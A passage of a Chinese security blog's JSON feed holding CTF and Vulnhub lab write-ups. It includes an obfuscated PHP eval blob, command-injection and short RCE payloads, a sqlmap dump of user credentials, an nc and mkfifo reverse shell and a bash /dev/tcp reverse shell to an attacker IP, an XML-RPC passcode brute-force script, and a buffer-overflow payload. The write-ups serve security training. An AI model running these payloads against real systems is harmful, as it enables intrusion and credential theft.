VUyMUhna3Z1YVhZYXZnZTN5aHhtaVBTSmZWaHZvMFUzZWVlNG9LZVBnSzVUbzNFMlB1ZWlma2hwVWtjdWYwNXNQS0FveWVlVmVoZUhvMWNJeWVVYUZWZXB4cXZIZTFVUnlKeG1Ta3hRZXU5dW8xVXl5Z0VzZ2hTUEp1dnRlSWtsVWV4b2Vra3lnaGt1dld2Z1BURXNpaGNQZWhjSHZ1eUlKSzVYZmV2V29rdEp2R0VNUHV0c1NLU2VpR1lUbmdoa0poSjFmaFJqaWh4SG5WdFF5UDFWeDFlTW5rVUh2UHZxZUNTVlJ1MVFMcUJvbmhZUnkxVW1MZWtlTGt2dXYydnNKMUo1b2VZcG5xMXVvMXMwVXFlVmdrdkJndVNnb0lrWEplZW1lVnZEVWtTSFBrWWtQZVVvZWVVa3hxOVVmMVlZZ2dZa2ZoaGVucVlpZTN2YWVLZDVGa3hCTHFZSGVoY015VEUwaUt2SlBLdFRlSjVYeVBCaXZrY0JMa3ZTdmhVQWVXY1huZVJBZ3V2b25XcjBVcVVQSlZlUUpLMXRuZ0UzVVAxVm5lVWtndTVnZUtSMEpJU1ZlZVJtVTNoVWZLQURKUEI0Z2VZWnZoZVduV3Z6VXFlVm9WU1BKVEV0b0llMnlUa2F4VnZrSkt0UG5rWUFQaEoxSnExRHZoeFNlMGNESjFlNFIyWURTZ1NXdjBVUVBnWWRpUFlaZWdZVWV1Y3NlaHhtdmVVQlVEa2Vua2NaeVBCaW5ra1dMcWV2RmhjUmVreGtmS2twSkdrSmYwVXR5UEJWeGtTeVVWNW9lSWVTZTF0YXllVVFKR2tKbmdoMnloZWRKcTFrUHVTdWZoY2xKUGQ1b2VTRGZEeGhuSlVCZXVlemllU2VGQ1lIaVZ3bUpleDRpa2g2UlRlaWZLOGpKMjFVU2VZa3hxY2lvM3cxZTJjUHZlU3FpV3hKZjBVWGdKdG1TaHhNb2tFVGVKc0lQSzVkUjA5V1B1OVNmSllTVWVlcFNlY3B4cWNKaWtjRFBLQlZlS2VwZmVjSmYwVUNlcXRvbnExcGVXdGlvMm1BVXFVRUZlWWRuVkFIbkttalVlZWR4aFVQUksxV3ZWdmd5aHRpUGVjeVUzeFd2Z3YzSklrdWYxeUFuVjlvZXE1TUpQQUVGcTFxVWtTSGUyQW1KS0FtUmh4RGVUdlN2VkF2Z2dyNWZrU3FnVGV0aURFTmUxSjVGa2tlRnExb2VxYzJQUDFWRmt1bWl1aGdlS3ZieTJBZXgyZWR2R2V1ZlBtMWdQNVRmMWVCZmdFZXZlYzFlQ1NpaWVjcGdLOVVmUHRWZXV4U0ZxOXlpdTVTZTA1aWVna29mMUpqZ2h2aGVWdmd5aHhwU0poTXhWQXVuSlVJaTBTVGwxRWN5M2VhdjJ2MFBQQjRlZWNDVTJCaG5lVWtlcXhteUpCQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRpMmNZTHFBQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRncVNpdjJ2eXZLdHVlSzltZ3FTaUwxU1BMcXRlZlZCYml1SjF4MllXTHFoVEozeDNncVNpdjJ2eXZLdHVlSzltaTFTcExxOTNOZzBIYWl1N05JND0iO2V2YWwoJz8+Jy4kQ0JoU2Z3KCR4V29JVnkoJFJrRUV1VigkalhqdEtkLCRZRmZLclcqMiksJFJrRUV1VigkalhqdEtkLCRZRmZLclcsJFlGZktyVyksJFJrRUV1VigkalhqdEtkLDAsJFlGZktyVykpKSk7&quot;));?&gt;\n</code></pre>\n<p>出题人挺骚的，一波base后</p>\n<pre><code class=\"php\">&lt;?php\ninclude(&#39;flag.php&#39;);\n$c=$_GET[&#39;ctf&#39;];\nif($c==&#39;show&#39;)&#123;\n    echo $flag;\n&#125;else&#123;\n    echo &#39;FLAG_NOT_HERE&#39;;\n&#125;\n?&gt;\n</code></pre>\n<p>那就很简单了，传入ctf&#x3D;show即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717183457526.png\" alt=\"image-20230717183457526\"></p>\n<h2 id=\"Web418\"><a href=\"#Web418\" class=\"headerlink\" title=\"Web418\"></a>Web418</h2><pre><code class=\"php\">&lt;?php\n$key= 0;\n$clear=&#39;clear.php&#39;;\nhighlight_file(__FILE__);\n//获取参数\n$ctfshow=$_GET[&#39;ctfshow&#39;];\n//包含清理脚本\ninclude($clear);\nextract($_POST);\nif($key===0x36d)&#123;\n    //帮黑阔写好后门\n    eval(&#39;&lt;?php &#39;.$ctfshow.&#39;?&gt;&#39;);\n&#125;else&#123;\n    $die?die(&#39;FLAG_NOT_HERE&#39;):clear($clear);\n&#125;\nfunction clear($log)&#123;\n    shell_exec(&#39;rm -rf &#39;.$log);\n&#125;\n</code></pre>\n<p>虽然题目上有后面，但是这里判断使用的是强等于，无法绕过，这里对于post传人的数据没有限制，这里完全可以进行变量覆盖，最后面还藏了一段clear这个函数，可以命令注入</p>\n<pre><code class=\"perl\">k=1&amp;die=0&amp;clear=;ls  &gt;1.txt\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717184415931.png\" alt=\"image-20230717184415931\"></p>\n<pre><code class=\"perl\">k=1&amp;die=0&amp;clear=;cat flag.php  &gt;1.txt\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717184446924.png\" alt=\"image-20230717184446924\"></p>\n<h2 id=\"Web419\"><a href=\"#Web419\" class=\"headerlink\" title=\"Web419\"></a>Web419</h2><pre><code class=\"php\">&lt;?php\nhighlight_file(__FILE__);\n\n\n$code = $_POST[&#39;code&#39;];\nif(strlen($code) &lt; 17)&#123;\n    eval($code);\n&#125;\n</code></pre>\n<p>长度限制，17位利用空间很大</p>\n<pre><code class=\"perl\">code=`cat f* &gt;1.txt`;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717185119636.png\" alt=\"image-20230717185119636\"></p>\n<h2 id=\"Web420\"><a href=\"#Web420\" class=\"headerlink\" title=\"Web420\"></a>Web420</h2><pre><code class=\"php\">&lt;?php\nhighlight_file(__FILE__);\n$code = $_POST[&#39;code&#39;];\nif(strlen($code) &lt; 8)&#123;\n    system($code);\n&#125; \n</code></pre>\n<p>这里可以直接rce了，不过长度现在在8位</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717185807749.png\" alt=\"image-20230717185807749\"></p>\n<p>这里找到flag在上一级目录中所以这里可以直接打开即可</p>\n<pre><code class=\"perl\">nl ../*\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717190115064.png\" alt=\"image-20230717190115064\"></p>\n<h2 id=\"Web421\"><a href=\"#Web421\" class=\"headerlink\" title=\"Web421\"></a>Web421</h2><pre><code class=\"php\">&lt;?php\n\nhighlight_file(__FILE__);\n\n\n$code = $_POST[&#39;code&#39;];\nif(strlen($code) &lt; 6)&#123;\n    system($code);\n&#125;\n</code></pre>\n<p>ok这次是6位</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717190324959.png\" alt=\"image-20230717190324959\"></p>\n<p>flag就在当前目录</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717190350528.png\" alt=\"image-20230717190350528\"></p>\n<h2 id=\"Web422\"><a href=\"#Web422\" class=\"headerlink\" title=\"Web422\"></a>Web422</h2><pre><code class=\"php\">&lt;?php\nhighlight_file(__FILE__);\n\n\n$code = $_POST[&#39;code&#39;];\nif(strlen($code) &lt; 5)&#123;\n    system($code);\n&#125; \n</code></pre>\n<p>长度是5位</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717190531729.png\" alt=\"image-20230717190531729\"></p>\n",
            "tags": [
                "CTFshow",
                "PHP代码审计函数绕过"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/07/16/hard_socnet2%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/",
            "url": "https://blog.xcu.icu/2023/07/16/hard_socnet2%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/",
            "title": "hard_socnet2的靶机打靶记录",
            "date_published": "2023-07-15T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>前面一直是中级和低级难度，这次挑战一个难度更高的，靶机下载地址 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9ib3JlZGhhY2tlcmJsb2cvaGFyZF9zb2NuZXQyLm92YQ==\">https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova</span></p>\n<h2 id=\"描述\"><a class=\"anchor\" href=\"#描述\">#</a> 描述</h2>\n<p>难度：困难</p>\n<p>涉及攻击方法:</p>\n<ul>\n<li>\n<p>主机发现</p>\n</li>\n<li>\n<p>端口扫描</p>\n</li>\n<li>\n<p>SQL 注入</p>\n</li>\n<li>\n<p>文件上传</p>\n</li>\n<li>\n<p>蚁剑上线</p>\n</li>\n<li>\n<p>CVE-2021-3493</p>\n</li>\n<li>\n<p>XMLRPC</p>\n</li>\n<li>\n<p>逆向工程</p>\n</li>\n<li>\n<p>动态调试</p>\n</li>\n<li>\n<p>缓冲区溢出</p>\n</li>\n<li>\n<p>漏洞利用代码编写</p>\n</li>\n</ul>\n<p>攻击目标：获得 root 权限</p>\n<h2 id=\"攻击流程\"><a class=\"anchor\" href=\"#攻击流程\">#</a> 攻击流程</h2>\n<h3 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716103556494.png\" alt=\"image-20230716103556494\" /></p>\n<p>这里看到目标靶机的 ip 是 192.168.13.33，接着扫描一下端口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716103503331.png\" alt=\"image-20230716103503331\" /></p>\n<p>这扫到端口，接着对端口进行一个服务的发现</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716104012080.png\" alt=\"image-20230716104012080\" /></p>\n<p>这里的 22 端口是一个 7.6 版本的 OpenSSH 服务，80 端口是一个 2.4.29 版本的 apache 的 httpd 服务，8000 端口是一个 python2.7 的 httpd 服务，这里还是通过浏览器去访问一下 80 和 8000 端口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716110008475.png\" alt=\"image-20230716110008475\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716110024217.png\" alt=\"image-20230716110024217\" /></p>\n<p>这里 8000 端口显示 GET 方法不支持，所以这里就去抓包改一下请求方式尝试一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716110433767.png\" alt=\"image-20230716110433767\" /></p>\n<p>这里暂时先放在这，先看 80 端口的服务，是一个登录页面也有一个注册功能这里先注册一个账号</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716112245276.png\" alt=\"image-20230716112245276\" /></p>\n<p>这里注册成功后就登录到后台页面了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716112337163.png\" alt=\"image-20230716112337163\" /></p>\n<p>这里看到有一个 admin 账号和 testuser 账号，这里可以看到有一个表单，这里提交尝试一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716112807721.png\" alt=\"image-20230716112807721\" /></p>\n<p>发现这里会将提交的表单都放到下面的 News Feed 中，admin 发布的一条消息</p>\n<figure class=\"highlight txt\"><figcaption data-lang=\"txt\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Hello friends! I've been working on a new script for monitoring servers. It's called monitor.py. I'm running on this server I'll post soon!</pre></td></tr></table></figure><p>可以看到这里有一个监控服务器的脚本，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1tb25pdG9yLTZ4M2x4NTVjZnN6LnB5\">名字是 monitor.py</span>，暂时不知道这个脚本在哪，暂时没有利用的思路</p>\n<p>这里去看一下个人主页，看看有没有什么有用的信息</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716114416886.png\" alt=\"image-20230716114416886\" /></p>\n<p>这里可以看到，他有一个上传一个头像的功能，于是我们这里测试一下有没有可能通过文件上传 getshell</p>\n<h3 id=\"文件上传\"><a class=\"anchor\" href=\"#文件上传\">#</a> 文件上传</h3>\n<p>这里上传一个 1.php 尝试一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716114731010.png\" alt=\"image-20230716114731010\" /></p>\n<p>这里尝试去访问一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716114826145.png\" alt=\"image-20230716114826145\" /></p>\n<p>这里看到，文件上传是成功的，对于我上传的文件内容这里可以看一下，就是很简单的一句话木马</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716114946651.png\" alt=\"image-20230716114946651\" /></p>\n<p>这里为了方便命令执行的回显，所以这里将 phpinfo 删除掉，再次上传</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716120056417.png\" alt=\"image-20230716120056417\" /></p>\n<p>这里已经拿到了一个 www-data 的权限</p>\n<h3 id=\"sql注入\"><a class=\"anchor\" href=\"#sql注入\">#</a> sql 注入</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716120257063.png\" alt=\"image-20230716120257063\" /></p>\n<p>在搜索的地方发现，当我输入单引号的时候这里产生了报错，并且将报错信息打印了出来，这里是有一个 sql 注入的点，于是我这里使用 sqlmap 来脱库，这里将 http 请求保存到一个文本中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716120711520.png\" alt=\"image-20230716120711520\" /></p>\n<p>这里使用</p>\n<pre><code class=\"language-perl\">sqlmap -r 1.txt -p query --dbs\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716120923740.png\" alt=\"image-20230716120923740\" /></p>\n<p>拿到所有的数据库的名字，接着看表名</p>\n<pre><code class=\"language-perl\">sqlmap -r 1.txt -p query -D socialnetwork --tables\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716121037112.png\" alt=\"image-20230716121037112\" /></p>\n<p>这里看到有一个 users 表，这里去看这个表有哪些字段</p>\n<pre><code class=\"language-perl\">sqlmap -r 1.txt -p query -D socialnetwork -T users --columns\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716121257265.png\" alt=\"image-20230716121257265\" /></p>\n<p>我们登录是需要邮箱和密码，所以这里我们查看对应的两个字段信息</p>\n<pre><code class=\"language-perl\">sqlmap -r 1.txt -p query -D socialnetwork -T users -C user_email,user_password --dump\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716121603790.png\" alt=\"image-20230716121603790\" /></p>\n<p>这里使用了 sqlmap 的功能将密码碰撞了出来，这里就可以直接用这两个账号去登录了，这里先去登录这个 admin 账号，但是这里并没有版本进一步利用</p>\n<h3 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h3>\n<p>还是回到刚刚拿到 sell 的地方，这里为了方便使用用蚁剑连接上</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716143558283.png\" alt=\"image-20230716143558283\" /></p>\n<p>这里因为权限还是 www-data，所以这里需要提权，这里看一下内核版本</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716143734442.png\" alt=\"image-20230716143734442\" /></p>\n<p>这里可以看见版本是 4.15，这里看一下具体的版本</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716143850793.png\" alt=\"image-20230716143850793\" /></p>\n<p>去网上查询了一下相关的漏洞发现 CVE-2021-3493 可以利用，这里贴一个 exp<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyaXNrZXRzL0NWRS0yMDIxLTM0OTM=\">briskets/CVE-2021-3493: Ubuntu OverlayFS Local Privesc (github.com)</span></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716144406222.png\" alt=\"image-20230716144406222\" /></p>\n<p>这里将 exp 放到靶机上，然后去编译运行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716144531715.png\" alt=\"image-20230716144531715\" /></p>\n<p>可以看到，这里是能够成功的，但是最后退出了，很显然是蚁剑的 shell 功能不全，这里去反弹一个 shell</p>\n<pre><code class=\"language-perl\">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.13.249 2333 &gt;/tmp/f\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716144941811.png\" alt=\"image-20230716144941811\" /></p>\n<p>这里就成功拿到了一个 shell，这里尝试去运行 exp</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716145022288.png\" alt=\"image-20230716145022288\" /></p>\n<p>这里可以看到，这样就成功了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716145044165.png\" alt=\"image-20230716145044165\" /></p>\n<p>这里就算是结束了，但是为什么说他的难度是困难呢，因为这台靶机制作时间是 20 年，没有这个 cve 可以直接利用，所以这里再从另一个角度去突破这台靶机</p>\n<p>这里回到普通用户的权限，为了增强终端可用性，这里再使用 python 来获取一个新的 shell</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716145948951.png\" alt=\"image-20230716145948951\" /></p>\n<h2 id=\"梅开二度\"><a class=\"anchor\" href=\"#梅开二度\">#</a> 梅开二度</h2>\n<h3 id=\"信息收集-2\"><a class=\"anchor\" href=\"#信息收集-2\">#</a> 信息收集</h3>\n<p>这里去看一下哪些用户是可以执行 shell 的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716150309081.png\" alt=\"image-20230716150309081\" /></p>\n<p>这里可以看到除了 root 外还有一个 socnet 用户是能执行 shell 的，这里也直接去看他的家目录</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716150452522.png\" alt=\"image-20230716150452522\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1tb25pdG9yLXFnMnJnMTZreHptMzZlLnB5\">这里看见 monitor.py</span>，刚刚再 web 页面提到这是一个管理员运行监视脚本</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716150659010.png\" alt=\"image-20230716150659010\" /></p>\n<p>这里可以看见这里确实有一个正在运行的 monitor 程序</p>\n<h3 id=\"漏洞利用\"><a class=\"anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h3>\n<p>这里也贴一下他的源码，我加了一点注释</p>\n<pre><code class=\"language-python\">import SimpleXMLRPCServer\nimport subprocess\nimport random\n\ndebugging_pass = random.randint(1000, 9999) # 生成一个随机数字\n\ndef runcmd(cmd):\n    results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n    output = results.stdout.read() + results.stderr.read()\n    return output\n\ndef cpu():\n    return runcmd(&quot;cat /proc/cpuinfo&quot;)  # 执行查看CPU信息的命令\n\ndef mem():\n    return runcmd(&quot;free -m&quot;)  # 执行查看内存信息的命令\n\ndef disk():\n    return runcmd(&quot;df -h&quot;)  # 执行查看磁盘信息的命令\n\ndef net():\n    return runcmd(&quot;ip a&quot;)  # 执行查看网络信息的命令\n\ndef secure_cmd(cmd, passcode):\n    if passcode == debugging_pass:\n        return runcmd(cmd)  # 如果传入的 passcode 与预设的 debugging_pass 相匹配，则执行指定的命令并返回结果\n    else:\n        return &quot;Wrong passcode.&quot;  # 如果 passcode 不匹配，则返回错误消息\n\nserver = SimpleXMLRPCServer.SimpleXMLRPCServer((&quot;0.0.0.0&quot;, 8000))\nserver.register_function(cpu)  # 注册 cpu() 函数\nserver.register_function(mem)  # 注册 mem() 函数\nserver.register_function(disk)  # 注册 disk() 函数\nserver.register_function(net)  # 注册 net() 函数\nserver.register_function(secure_cmd)  # 注册 secure_cmd() 函数\n\nserver.serve_forever()\n\n</code></pre>\n<p>这里根据导入的包可以看到使用了 XMLRPC 模块，这段代码的大致作用就是，创建了一个简单的 XML-RPC 服务器，服务监听再 0.0.0.0 的 8000 端口上（就是前面探测到的端口），再 runcmd 中创建了一个新的进程，执行 cmd 命令，最后通过 outPut 输出到页面，在 secure_cmd 函数中如果传入的 passcode 等于上面生成的随机数，就会调用 runcmd 函数，去执行命令，这里需要拿到这个随机数，这里写脚本去爆破一下这个数字</p>\n<pre><code class=\"language-python\">import xmlrpc.client\n\nwith xmlrpc.client.ServerProxy(&quot;http://192.168.13.33:8000/&quot;) as peoxy:\n    for i in range(1000,10000):\n        p = str(peoxy.secure_cmd('ls',i))\n        print(p+str(i))\n        if &quot;Wrong&quot; in p:\n            pass\n        else:\n            print(i)\n            break\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716154626492.png\" alt=\"image-20230716154626492\" /></p>\n<p>这里爆出这个随机数为 5727，这里改一下脚本执行 whoami</p>\n<pre><code class=\"language-python\">import xmlrpc.client\n\nwith xmlrpc.client.ServerProxy(&quot;http://192.168.13.33:8000/&quot;) as peoxy:\n    p = str(peoxy.secure_cmd('whoami',5727))\n    print(p)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716154815507.png\" alt=\"image-20230716154815507\" /></p>\n<p>可以看到，这里拿到的是 socnet 的 shell，这里反弹一个 shell 出来</p>\n<h3 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h3>\n<p>这里再改一下脚本</p>\n<pre><code class=\"language-python\">import xmlrpc.client\n\nwith xmlrpc.client.ServerProxy(&quot;http://192.168.13.33:8000/&quot;) as peoxy:\n    p = str(peoxy.secure_cmd('bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.13.249/2444 0&gt;&amp;1&quot;',5727))\n    print(p)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716155307918.png\" alt=\"image-20230716155307918\" /></p>\n<p>这里就成功拿到 socnet 一个 shell，这里还是看这个目录</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716160607804.png\" alt=\"image-20230716160607804\" /></p>\n<p>这里还不是 root 用户，这里可以看到 add_record 文件是所属 root 的，这里可以尝试利用这个文件来提权，这里先查看一下这个文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716160911104.png\" alt=\"image-20230716160911104\" /></p>\n<h3 id=\"溢出\"><a class=\"anchor\" href=\"#溢出\">#</a> 溢出</h3>\n<p>这里可以看到这个文件是一个 32 为的 elf 文件，统计目录下有一个 peda 的动态调试环境，这里可以使用 gdb 来调试这个程序</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716165631205.png\" alt=\"image-20230716165631205\" /></p>\n<p>这里输入 2000 个 A，程序直接退出了，看来是没有溢出，这要都测试了一下，最后是在工作失误的备注中发现出现了溢出问题</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716170232543.png\" alt=\"image-20230716170232543\" /></p>\n<p>这里可以看到，已经成功看到溢出问题</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716170622658.png\" alt=\"image-20230716170622658\" /></p>\n<p>这里重点关注一下 EIP（存放下一条指令的地址）这里 EIP 也被覆盖了，这里先测试一下溢出的临界区是多少</p>\n<p>这里用 gdb 生成 500 个字符</p>\n<figure class=\"highlight txt\"><figcaption data-lang=\"txt\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pattern create 500</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A</pre></td></tr></table></figure><p>用这 500 字符去溢出，然后就可以找到是哪些字符导致溢出</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716171850177.png\" alt=\"image-20230716171850177\" /></p>\n<p>使用 gdb 来查找溢出位置</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716172704017.png\" alt=\"image-20230716172704017\" /></p>\n<p>这里可以看到是 AAHA，是从第 62 为开始后 4 为溢出到 EIP，这里测试一下先向 EIP 写入 1234</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716172827755.png\" alt=\"image-20230716172827755\" /></p>\n<p>这里可以通过 disas main 看一下 main 函数的汇编</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716173347518.png\" alt=\"image-20230716173347518\" /></p>\n<p>这里可以看到地址 0x08048729 位置使用了 call 函数调用了一个 open 的内置函数，很显然应该是打开文件的一个操作，这里下一个断点验证一下我们的猜测</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716173655871.png\" alt=\"image-20230716173655871\" /></p>\n<p>直接使用 r 命令</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716173843076.png\" alt=\"image-20230716173843076\" /></p>\n<p>可以看到这里接下来就要去执行这个 call，这里使用 s，单步执行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716174407845.png\" alt=\"image-20230716174407845\" /></p>\n<p>这里可以看见，这里在打开这个 employee_records.txt 文件，这里看到后面调用了一个 vuln</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716175051436.png\" alt=\"image-20230716175051436\" /></p>\n<p>利用点就在这里，这里使用 info func 来查看程序中的函数信息</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716175329711.png\" alt=\"image-20230716175329711\" /></p>\n<p>这里看到两个函数，backdoor，vuln</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716175451674.png\" alt=\"image-20230716175451674\" /></p>\n<p>这里调用了 strcpy 函数，这里的历史版本是存在缓冲区溢出的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716175555968.png\" alt=\"image-20230716175555968\" /></p>\n<p>backdoor 调用了 system 可以进行命令执行，并且在这之前调用了 setuid，这里用这个起始地址放到 EIP 中</p>\n<p>大致的逻辑就是，main 函数中的 vuln 会调用 strcpy，存在缓冲区溢出到 backdoor，最后执行 system 函数，这里根据思路生成一个 payload</p>\n<pre><code class=\"language-python\"> python -c &quot;import struct;print(str('a\\n1\\n1\\n1\\n')+str('A'*62)+str(struct.pack('I',0x08048676)))&quot; &gt; p\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716182038560.png\" alt=\"image-20230716182038560\" /></p>\n",
            "tags": [
                "Vulnhub",
                "Vulnhub"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/07/15/Chronos%E7%9A%84%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/",
            "url": "https://blog.xcu.icu/2023/07/15/Chronos%E7%9A%84%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/",
            "title": "Chronos的靶机打靶记录",
            "date_published": "2023-07-14T16:00:00.000Z",
